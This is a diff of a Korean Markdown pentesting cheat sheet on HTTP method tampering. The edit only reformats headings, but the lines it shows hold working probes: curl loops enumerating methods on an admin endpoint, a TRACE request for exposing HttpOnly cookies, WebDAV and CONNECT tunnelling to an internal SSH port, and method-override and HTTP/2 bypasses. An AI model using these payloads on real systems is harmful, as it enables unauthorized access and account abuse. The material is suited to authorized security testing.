@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**Method enumeration (어떤 method 허용되는지):**
+#### Method enumeration (어떤 method 허용되는지)
 ```bash
 for m in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
   curl -X $m "https://target/admin/users" -H "Cookie: session=USER" -v 2>&1 | grep "^< HTTP"
@@ -26,34 +26,34 @@ HEAD /api/transfer?to=attacker&amount=100  Cookie: session=USER
 OPTIONS /api/admin/secret  Cookie: session=USER
 ```
 
-**TRACE (Cross-Site Tracing):**
+#### TRACE (Cross-Site Tracing)
 ```bash
 curl -X TRACE "https://target/" -v
 # 200 + Content-Type: message/http + 요청 echo (HttpOnly 쿠키 노출)
 ```
 
-**WebDAV/특수 method:**
+#### WebDAV/특수 method
 ```bash
 for m in PROPFIND COPY MOVE LOCK UNLOCK MKCOL DELETE; do
   curl -X $m "https://target/files/x" -H "Depth: 1" -v
 done
 ```
 
-**CONNECT (프록시 터널):**
+#### CONNECT (프록시 터널)
 ```
 CONNECT internal.local:22 HTTP/1.1
 Host: target
 ```
 
-**Spring `@RequestMapping` (method 미지정) 우회:**
+#### Spring `@RequestMapping` (method 미지정) 우회
 - `TRACE`, `OPTIONS`, `HEAD` 같은 비표준 method 시도 (Spring Security가 GET만 보호하면 우회)
 
-**HTTP/2 `:method`:**
+#### HTTP/2 `:method`
 ```bash
 curl --http2 "https://target/admin" -X PATCH
 ```
 
-**Case sensitivity:**
+#### Case sensitivity
 - `get` (소문자)
 - `Get` (Mixed)
 - `GET` (대문자)
@@ -74,7 +74,7 @@ curl --http2 "https://target/admin" -X PATCH
 | HTTP/1.1 method 검증 | HTTP/2 `:method` pseudo-header 다른 값 — `--http2 -X PATCH` |
 | Method override 헤더 일부만 차단 | `X-HTTP-Method-Override` 차단 → `X-Method-Override`/`X-HTTP-Method` 시도 |
 
-**검증 테스트:**
+#### 검증 테스트
 ```bash
 # 모든 method × 모든 override 헤더 조합
 for m in PUT DELETE PATCH; do
